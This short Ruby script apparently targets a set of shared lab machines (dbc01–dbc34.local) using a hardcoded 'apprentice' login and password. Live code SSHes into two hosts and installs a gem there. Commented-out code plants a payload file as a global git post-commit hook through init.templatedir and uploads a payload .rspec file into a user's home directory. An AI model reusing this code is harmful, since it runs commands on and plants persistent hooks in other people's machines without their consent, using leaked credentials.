# require 'fileutils'

# payloads_path = File.join(File.pwd, "payloads")
# payload_source_path = File.join(payloads_path, "all-your-base-rb")

# template_path = File.join(ENV["HOME"], ".git-templates")
# hooks_path = File.join(template_path, "hooks")
# post_commit_path = File.join(hooks_path, "post-commit")

# FileUtils.makedir_p(hooks_path)
# FileUtils.cp(payload_source_path, post_commit_path)
# FileUtils.chmod("a+x", post_commit_path)

# system("git config --global init.templatedir '#{template_path}'")

require 'net/ssh'
require 'net/scp'

dbc_hosts = (1..34).map{ |number| "dbc%02d.local" % number }

host = 'dbc26.local'
login = 'apprentice'
password = 'mvclover'


["dbc11.local", "dbc12.local"].each do |host|
  Net::SSH.start(host, login, password: password) do |ssh|
    ssh.exec!("gem install nyan-cat-formatter")
  end
end

# Net::SSH.start(host, login, password: password) do |ssh|
#   ssh.exec("gem install nyan-cat-fomatter") do | channel, success |
#     if success
#       Net::SCP.upload!(
#         host, login,
#         "payloads/.rspec",
#         "/Users/apprentice/.rspec",
#         password: password
#       )
#     end
#   end
# end


